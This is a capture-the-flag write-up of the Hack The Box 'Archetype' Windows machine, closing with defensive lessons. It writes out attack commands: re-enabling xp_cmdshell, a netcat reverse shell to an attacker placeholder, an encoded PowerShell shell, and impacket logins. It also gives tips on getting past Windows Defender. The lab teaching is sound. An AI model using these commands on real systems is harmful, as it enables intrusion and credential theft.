---
title: "Archetype — HTB Writeup"
date: 2026-06-12
draft: false
---

**Difficulty:** Easy | **OS:** Windows | **Date:** June 2026

## Overview

Archetype is the first Windows box in HTB's Tier II track, and it's built
around a theme that shows up constantly in real enterprise environments:
database service accounts that know too much, and configuration files that
remember too much. There's no exploit-dev here, no CVE to chase — just a
chain of three small trust failures that compound into a full domain-admin-
equivalent compromise. If you've ever inherited a SQL Server box from a team
that "got it working a while ago and never touched it again," this writeup
will feel uncomfortably familiar.

## Kill Chain Summary

1. Anonymous SMB access to a `backups` share exposes an SSIS deployment
   config file.
2. That config file contains a cleartext database connection string,
   including the password for a Windows service account (`sql_svc`).
3. `sql_svc` turns out to be a sysadmin on the MSSQL instance — re-enabling
   `xp_cmdshell` gives full OS command execution.
4. A PowerShell reverse shell lands as `archetype\sql_svc` — user flag.
5. `sql_svc`'s PowerShell history contains a plaintext Administrator
   password, used in an earlier `net use` command.
6. That password gets us a SYSTEM shell via `psexec` — root flag.

## Recon & Enumeration

A standard `nmap -sC -sV -Pn` against the target showed a small, telling
surface for a "modern" Windows Server 2019 box:

- 135/139/445 — SMB, with guest access allowed and message signing
  *enabled but not required*
- 1433 — Microsoft SQL Server 2017
- 5985 — WinRM (open here, though not part of the original write-up's path —
  more on that below)

The combination of "SMB reachable with guest" and "SQL Server reachable from
outside the host" is already a flag. MSSQL boxes frequently have a Windows
service account tied to them, and that account's credentials have to live
*somewhere* — usually in a connection string, a scheduled task, or an
environment variable. The question is just how exposed that "somewhere" is.

## Foothold

`smbclient -N -L //<target>/` (guest, no password) enumerated the available
shares. `ADMIN$` and `C$` predictably refused access, but a custom share named
`backups` was wide open. Inside sat a single file: `prod.dtsConfig`.

That extension is the giveaway — `.dtsConfig` files are SSIS (SQL Server
Integration Services) deployment configuration files, generated when someone
exports a package's connection settings so it can be redeployed without
opening Visual Studio. They're meant to be portable, which is exactly the
problem: by default, the connection string — including the password — is
stored as plaintext XML. Pulling the file down with `get` and reading it
revealed:

```
Data Source=.;Password=<redacted>;User ID=ARCHETYPE\sql_svc;
Initial Catalog=Catalog;Provider=SQLNCLI10.1;...
```

That's a domain-formatted Windows account (`ARCHETYPE\sql_svc`) with a
cleartext password, sitting on a share that required zero authentication to
read. This is the vulnerability *class* worth internalizing: SSIS/ETL tooling
routinely generates artifacts that bundle credentials for "automation
convenience," and those artifacts have a habit of ending up in backup shares,
build output directories, or version control. The fix isn't "don't use
SSIS" — it's "treat any `.dtsConfig`, `.config`, or deployment manifest as a
secret, and audit who can read the directories they land in."

With those credentials in hand, `impacket-mssqlclient` connected using
Windows authentication:

```
impacket-mssqlclient ARCHETYPE/sql_svc:'<redacted>'@<target> -windows-auth
```

The first thing worth checking on any MSSQL foothold is your role:

```sql
SELECT is_srvrolemember('sysadmin');
```

This returned `1` — `sql_svc` is a sysadmin on this instance. That's the
second trust failure: a *service* account used to run ETL jobs had the same
privilege level as a DBA. From sysadmin, `xp_cmdshell` (disabled by default
since SQL Server 2005, for exactly this reason) can be re-enabled by anyone
with that role:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';  -- archetype\sql_svc
```

At that point, the database server is just a shell with a SQL parser in
front of it.

For the reverse shell itself, I deviated slightly from the original
write-up. The classic approach is to stage `nc64.exe` via PowerShell's
`wget`/`Invoke-WebRequest` and run `nc64.exe -e cmd.exe <attacker> <port>`.
Staging worked fine — but the resulting `nc64.exe` process never phoned
home, even though `Test-NetConnection` confirmed outbound TCP to my listener
port was reachable. My read is that this is Windows Defender's behavioral
engine flagging the `-e`/exec-spawn pattern specifically (a very
well-signatured technique), rather than a network-layer block — the process
just sat there doing nothing. Killing those stuck processes and switching to
a base64-encoded PowerShell TCP client one-liner (`powershell -enc <...>`)
connected immediately. The lesson: when a "should work" payload silently does
nothing, separate *network reachability* from *payload execution* before
assuming the network is the problem — and have a built-in-tooling fallback
ready, since living-off-the-land payloads draw far less attention than
dropping known offensive binaries to disk.

With a shell as `archetype\sql_svc`, the user flag was sitting in
`C:\Users\sql_svc\Desktop\user.txt`.

## Privilege Escalation

The third trust failure was the easiest to find and the most common in real
incident response: **PowerShell command history**. `PSReadline` (the module
behind PowerShell's tab-completion and history) persists every line typed in
an interactive session to:

```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

This is PowerShell's `.bash_history` equivalent, and it has the same blind
spot bash does: it doesn't care whose credentials you typed, only that you
typed them. Reading the file turned up:

```
net.exe use T: \\Archetype\backups /user:administrator <redacted>
exit
```

At some point, whoever administered this box mapped the `backups` share as
Administrator, typing the password directly into the command line — and
PSReadline dutifully wrote it to disk in the `sql_svc` profile, where it
remained readable by that account indefinitely. This is a great example of
*lateral* credential exposure: the vulnerability isn't in how Administrator's
account is configured, it's in an unrelated account's history file. Anyone
who's ever typed a password into `net use`, `mysql -p`, `psql`, or a
connection string on a Windows box has potentially left this exact trail.

From there, `impacket-psexec administrator:'<redacted>'@<target>`
uploaded a service binary over `ADMIN$`, registered and started it as a
service, and dropped into a shell running as `nt authority\system`. Root
flag, `C:\Users\Administrator\Desktop\root.txt`, captured.

Notably, I didn't need the `SeImpersonatePrivilege` / JuicyPotato-style
fallback the original write-up mentions as a backup path — the PowerShell
history was sufficient, which matches the "primary" path in the source
material. I also noticed WinRM (5985) was open on this instance, which the
original write-up doesn't mention; `evil-winrm` with the recovered
Administrator credentials would have been an equally valid (and arguably
cleaner) route to the same SYSTEM shell.

## Key Takeaways

1. **Deployment artifacts are credentials.** `.dtsConfig`, `web.config`,
   `appsettings.json`, CI/CD pipeline definitions — any file generated by a
   "deploy this for me" tool is a strong candidate for embedded plaintext
   secrets. Treat the directories that hold them as sensitive, even on
   internal shares.

2. **Service accounts should not be sysadmins.** The entire chain pivots on
   `sql_svc` having a role far beyond what an ETL job needs. Principle of
   least privilege for service accounts isn't bureaucratic box-checking —
   it's the difference between "a leaked password reads one database" and
   "a leaked password owns the host."

3. **`xp_cmdshell` is disabled for a reason.** Its existence as a
   re-enableable stored procedure means "sysadmin on SQL Server" and
   "Administrator on the host" are effectively the same trust boundary on a
   default install. This maps cleanly to MITRE ATT&CK
   [T1505.001](https://attack.mitre.org/techniques/T1505/001/) (server
   software component abuse) and is a staple of real-world post-exploitation
   against MSSQL.

4. **Command history is a credential store you didn't ask for.** PSReadline
   (and `.bash_history` on Linux) will happily immortalize any secret typed
   on a command line, attached to whichever account ran the shell — not the
   account the secret belongs to. This is ATT&CK
   [T1552.001](https://attack.mitre.org/techniques/T1552.001/)
   (Credentials In Files), and the mitigation is procedural: never type
   secrets directly into commands; use credential prompts, vaults, or
   `Get-Credential`.

5. **When a payload "should work" but doesn't, isolate the variable.** The
   stuck `nc64.exe` reverse shell looked like a network problem until I
   tested network reachability independently of the payload. Endpoint
   defenses increasingly target *behaviors* (process spawning a network
   connection and binding it to a shell), not just file hashes — living-off-
   the-land alternatives (PowerShell, certutil, etc.) are worth keeping as a
   first resort, not a fallback.

## Tools & Techniques

| Tool | Purpose | Notable flags used |
|---|---|---|
| `nmap` | Service/version discovery | `-sC -sV -Pn -p-` |
| `smbclient` | Anonymous SMB share enumeration & file pull | `-N -L`, `get` |
| `impacket-mssqlclient` | Authenticate to MSSQL, enable `xp_cmdshell` | `-windows-auth` |
| PowerShell (encoded) | Reverse shell without dropping known binaries | `powershell -enc <base64 UTF-16LE>` |
| `impacket-psexec` | Remote SYSTEM shell via SMB/SVCManager | n/a |
